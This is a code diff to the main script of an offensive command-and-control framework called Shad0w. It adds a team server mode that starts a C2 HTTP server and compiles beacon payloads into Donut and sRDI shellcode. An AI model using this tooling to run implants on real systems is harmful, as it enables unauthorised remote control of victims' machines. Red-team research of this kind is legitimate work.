@@ -18,12 +18,18 @@ from lib import buildtools
 from lib import mirror
 from lib import payload_format
 from lib import tools
+from lib import configparse
+from lib import treeprint
+from lib import teamserver
 
 class Shad0wC2(object):
 
     def __init__(self, args):
 
         super(Shad0wC2, self).__init__()
+
+        # running with a teamserver?
+        self.teamserver              = False
 
         # payload store
         self.payloads                = {}
@@ -55,7 +61,7 @@ class Shad0wC2(object):
         self.screen_finish  = False
 
         # get the debug/logging stuff ready
-        self.debug                   = debug.Debug(self.debugv)
+        self.debug                   = debug.Debug(self)
 
         # console class
         self.console                 = console.Console(self)
@@ -90,17 +96,12 @@ class Shad0wC2(object):
         banner.Banner()
 
         # start the http server thread
-        # self.debug.log("starting http server thread")
         thttp = Thread(target=http_server.run_serv, args=(self,))
         thttp.daemon = True
         thttp.start()
-        # asyncio.run(http_server.run_serv(self))
 
         # start the console
         asyncio.run(self.console.start())
-        # tconsole = Thread(target=self.console.start)
-        # tconsole.daemon = False
-        # tconsole.start()
 
 
 class Shad0wBuilder(object):
@@ -163,6 +164,112 @@ class Shad0wTeamServer(object):
 
         self.config = args['config']
 
+        self.ready_to_go = False
+
+        self.addr = None
+        self.port = None
+
+        self.cert = None
+        self.key  = None
+
+        self.c2_addr     = None
+        self.c2_port     = None
+        self.c2_endpoint = None
+
+        self.db_location = None
+
+        self.configparser = configparse.ConfigParse(self.config)
+
+    def start(self):
+        """
+        Start the team server
+        """
+
+        # start the output
+        treeprint.print_start()
+
+        # show starting teamserver
+        treeprint.print_pending("Started Team Server Server")
+
+        # init the parser
+        self.configparser.init()
+
+        # parse the config file
+        self.configparser.parse(self)
+
+        # init the teamserver
+        self.teamserver = teamserver.TeamServer(self)
+
+        # start the teamserver
+        teamservr = Thread(target=self.teamserver.start_running, args=(self,))
+        teamservr.daemon = True
+        teamservr.start()
+
+        # teamserver is started
+        treeprint.print_done("Started Team Server")
+
+        # show config
+        treeprint.print_sub_straight(f"Configuration: {self.config}")
+
+        # make sure we are in the rootdir
+        os.chdir("/root/shad0w")
+
+        # show we starting the C2 server
+        treeprint.print_pending("Started C2 Server")
+
+        # create the args dict
+        args = {
+            "address": self.c2_addr,
+            "port": self.c2_port,
+            "endpoint": self.c2_endpoint,
+            "debug": False,
+            "cert": "certs/cert.pem",
+            "key": "certs/key.pem",
+            "mirror": None
+        }
+
+        # create the object
+        self.shad0w = Shad0wC2(args)
+
+        # tell it we are running with a teamserver
+        self.shad0w.teamserver = True
+
+        # start the http server thread
+        thttp = Thread(target=http_server.run_serv, args=(self.shad0w,))
+        thttp.daemon = True
+        thttp.start()
+
+        # C2 started
+        treeprint.print_done("Started C2 Server")
+
+        # display some of the config the c2 is set with
+        treeprint.print_sub_straight(f"SSL Key: {args['key']}")
+        treeprint.print_sub_straight(f"SSL Cert: {args['cert']}")
+
+        # start building the payloads
+        treeprint.print_infomation("Building Payloads")
+
+        # compile the the exe and get donut shellcode
+        treeprint.print_sub_pending("EXE")
+        asyncio.run(tools.compile_and_store_static(shad0w))
+        treeprint.print_sub_done("EXE")
+
+        # compile the the dll and get srdi shellcode
+        treeprint.print_sub_pending("DLL")
+        asyncio.run(tools.compile_and_store_static_srdi(shad0w))
+        treeprint.print_sub_done("DLL")
+
+        # end of tree
+        treeprint.print_end()
+
+        # teamserver is ready
+        print("")
+        print(f"[i] Team Server is ready on {self.addr}:{self.port}")
+        print(f"[i] C2 is ready on {self.c2_addr}:{self.c2_port}")
+
+        # keep the main thread active
+        while True: pass
+
 
 if __name__ == '__main__':
 
@@ -191,7 +298,7 @@ if __name__ == '__main__':
     beacon_parser.add_argument("-n", "--no-shrink", required=False, action='store_true', help="Leave the file at its final size, do not attempt to shrink it")
     beacon_parser.add_argument("-d", "--debug", required=False, action='store_true', help="Start debug mode")
 
-    teamsrv_parse.add_argument("-c", "--config", required=True, help="The configuration for the team server")
+    teamsrv_parse.add_argument("-c", "--config", required=False, default="config/shad0w_default.yaml", help="The configuration for the team server")
 
     # parse the args
     args = vars(parser.parse_args())
@@ -212,3 +319,9 @@ if __name__ == '__main__':
         # build the beacon
         shad0w = Shad0wBuilder(args)
         shad0w.build()
+
+    # handle setting up the team server
+    if args["mode"] == "teamserver":
+        # start the team server
+        shad0w_teamserver = Shad0wTeamServer(args)
+        shad0w_teamserver.start()
